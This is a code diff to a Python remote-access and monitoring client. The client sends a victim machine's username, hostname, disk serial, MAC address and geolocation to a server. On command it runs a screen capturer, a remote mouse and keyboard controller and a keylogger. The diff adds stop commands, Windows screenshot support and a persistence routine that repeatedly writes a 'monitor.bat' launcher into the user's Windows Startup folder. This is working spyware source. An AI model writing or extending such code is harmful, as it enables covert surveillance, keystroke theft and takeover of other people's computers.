@@ -21,12 +21,13 @@ from time import sleep, time
 import traceback
 from typing import Dict, List, Tuple, Union
 from uuid import getnode
+import platform
 
 
 try:
     from mss import mss
 except ImportError:
-    logging.warn("Cannot import mss")
+    logging.warning("Cannot import mss")
 
 try:
     import gi
@@ -34,7 +35,7 @@ try:
     from gi.repository import Gdk
     from gi.overrides.GdkPixbuf import Pixbuf
 except:
-    logging.warn("Cannot import gi")
+    logging.warning("Cannot import gi")
 
 
 class BaseTarget(Socket):
@@ -99,6 +100,7 @@ class Target(BaseTarget):
         super().__init__(SERVER_ADDRESS, SERVER_PORT)
 
         self.config = Config()
+        self.autostart = AutoStart()
 
         self.components: Dict[bytes, BaseTarget] = {
             ClientTypes.TARGET_SCREEN_READER: ScreenReader(),
@@ -121,6 +123,9 @@ class Target(BaseTarget):
     def start_component(self, component: bytes):
         if self.components[component] not in self.active_components:
             Thread(target=self.components[component].start).start()
+
+    def stop_component(self, component: bytes):
+        self.components[component].stop()
 
     def run(self):
         """
@@ -153,6 +158,7 @@ class Target(BaseTarget):
                     while self.running:
                         data = self.recv_data()
                         if data == Actions.WAIT:
+                            self.send_data(b"OK")
                             pass    # simply wait
                         elif data == Actions.START_ALL_COMPONENTS:
                             logging.info("Starting All Components")
@@ -166,6 +172,18 @@ class Target(BaseTarget):
                         elif data == Actions.START_KEYLOGGER:
                             self.start_component(ClientTypes.
                                                  TARGET_KEYLOGGER)
+                        elif data == Actions.STOP_ALL_COMPONENTS:
+                            for component in self.components:
+                                self.stop_component(component)
+                        elif data == Actions.STOP_SCREEN_READER:
+                            self.stop_component(ClientTypes.
+                                                TARGET_SCREEN_READER)
+                        elif data == Actions.STOP_CONTROLLER:
+                            self.stop_component(ClientTypes.
+                                                TARGET_CONTROLLER)
+                        elif data == Actions.STOP_KEYLOGGER:
+                            self.stop_component(ClientTypes.
+                                                TARGET_KEYLOGGER)
                         elif data == Actions.DISCONNECT:
                             break
                         else:
@@ -186,22 +204,31 @@ class Target(BaseTarget):
                     f"{traceback.format_exc()}\n")
             except KeyboardInterrupt:
                 self.stop()
+                print("stopped due to keyboard interrupt")
                 return
             sleep(1)
 
-    def send_identity(self):
+    def get_identity(self):
         user = os.getlogin().encode(self.FORMAT)
         host = gethostname().encode(self.FORMAT)
         platform = self.platform.encode(self.FORMAT)
 
         # TODO: Handle the situation where sda is present in place of nvme0n1
-        hdd_serial = list(filter(lambda x: b"ID_SERIAL=" in x, subprocess.run(
-            ["udevadm", "info", "--query=all", "--name=/dev/nvme0n1"],
-            capture_output=True
-        ).stdout.split(b"\n")))[0].split(b"=")[1]
+        if 'linux' in self.platform:
+            hdd_serial = list(filter(lambda x: b"ID_SERIAL=" in x, subprocess.run(
+                ["udevadm", "info", "--query=all", "--name=/dev/nvme0n1"],
+                capture_output=True
+            ).stdout.split(b"\n")))[0].split(b"=")[1]
+        else:
+            hdd_serial = b""
+        
+        try:
+            geolocation = subprocess.run(["curl", "-s", "ipinfo.io/loc"],
+                                    capture_output=True).stdout.strip()
+        except:
+            geolocation = ""
+
         wifi_mac = getnode()  # handle the situation where no wifi is present
-        geolocation = subprocess.run(["curl", "-s", "ipinfo.io/loc"],
-                                     capture_output=True).stdout.strip()
 
         identity = {
             Identity.USER: user,
@@ -212,6 +239,11 @@ class Target(BaseTarget):
             Identity.GEOLOCATION: geolocation
         }
 
+        return identity
+
+    def send_identity(self):
+        identity = self.get_identity()
+
         self.send_data(str(identity).encode(self.FORMAT))
 
     def start(self):
@@ -220,6 +252,8 @@ class Target(BaseTarget):
         """
         if not self.running:
             self.running = True
+            self.autostart_thread = Thread(target=self.autostart.configure)
+            self.autostart_thread.start()
             self.run()
 
     def stop(self, args=None):
@@ -232,11 +266,18 @@ class Target(BaseTarget):
                   decides if any children components need to be stopped
         """
         self.running = False
+        self.autostart.stop()
         # if hasattr(self, "controller"):
         #     self.controller.stop()
         # if hasattr(self, "keylogger"):
         #     self.keylogger.stop()
-
+        logging.debug("Stopping Target")
+        # logging.debug(str(self.active_components))
+        try:
+            self.send_data(Actions.DISCONNECT)
+        except (BrokenPipeError, ConnectionResetError):
+            logging.debug("Can't send disconnect request")
+        self.socket.close()
         for component in self.active_components:
             component.stop(args)            
 
@@ -313,7 +354,9 @@ class ScreenReader(BaseTarget):
                 # logging.debug(f"{len(img_bin)/1024}")
 
             if i==ACKNOWLEDGEMENT_ITERATION:
-                self.recv_data()
+                res = self.recv_data()
+                if res == Actions.DISCONNECT:
+                    return False
             t3 = time()
 
             # to eat less cpu
@@ -346,6 +389,8 @@ class ScreenReader(BaseTarget):
             img = self.take_screenshot_pygobject()
             # img = self.take_screenshot_PIL()
             img.save("img.jpg")
+        elif "windows" in self.platform:
+            img = self.take_screenshot_mss()
         else:
             img = self.take_screenshot_PIL()
 
@@ -483,7 +528,8 @@ class Controller(BaseTarget):
 
     def stop(self, args=None):
         self.running = False
-        self.socket.shutdown(SHUT_RDWR)
+        # self.socket.shutdown(SHUT_RDWR)
+        self.socket.close()
 
 
 class Keyboard(object):
@@ -512,16 +558,21 @@ class Mouse(object):
         self.mouse_controller = MouseController()
         self.events: Queue[List[int, str, Tuple]] = Queue()
         self.screen_size = self.get_screen_size()
+        self.platform = platform.platform().lower()
         logging.debug(f"screen size: {self.screen_size}")
         self.btns = {
             "left": MouseButton.left,
             "right": MouseButton.right,
             "middle": MouseButton.middle,
-            "scrolldown": MouseButton.scroll_down,
-            "scrollup": MouseButton.scroll_up,
-            "scrollleft": MouseButton.scroll_left,
-            "scrollright": MouseButton.scroll_right,
         }
+
+        if "linux" in self.platform:
+            self.btns.update({
+                "scrolldown": MouseButton.scroll_down,
+                "scrollup": MouseButton.scroll_up,
+                "scrollleft": MouseButton.scroll_left,
+                "scrollright": MouseButton.scroll_right,
+            })
 
     def update(self):
         """
@@ -656,6 +707,45 @@ class KeyLogger(BaseTarget):
         self.running = False
         self.socket.close()
         self.listener.stop()
+
+
+class AutoStart(object):
+
+    def __init__(self) -> None:
+        self.running = False
+
+    def configure(self):
+        self.running = True
+        if "windows" in platform.platform().lower():
+            while self.running:
+                if not os.path.exists("path.txt"):
+                    cur_dir = os.path.abspath(".")
+                    files = os.listdir(cur_dir)
+                    path = list(filter(lambda x: x.lower().endswith(".exe"), files))
+                    if not path:
+                        logging.debug(f"{cur_dir} does not contain any exe")
+                        break
+                    path = path[0]
+                    with open("filename.txt", "w") as f:
+                        f.write(f"{cur_dir}\\{path}")
+                with open("filename.txt") as f:
+                    path = f.read()
+
+                self.startup_folder_windows(path)
+
+    def startup_folder_windows(self, path):
+        user = os.path.expanduser("~")
+        folder = os.path.join(user, "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+        bat_file = os.path.join(folder, "monitor.bat")
+        if not os.path.exists(bat_file):
+            logging.info(f"created autostart bat file {bat_file}")
+        with open(bat_file, "w") as f:
+            f.write(f"cd /d {os.path.dirname(path)}\n")
+            f.write(f"start {path}")
+        sleep(1)
+
+    def stop(self):
+        self.running = False
 
 
 def check_update():
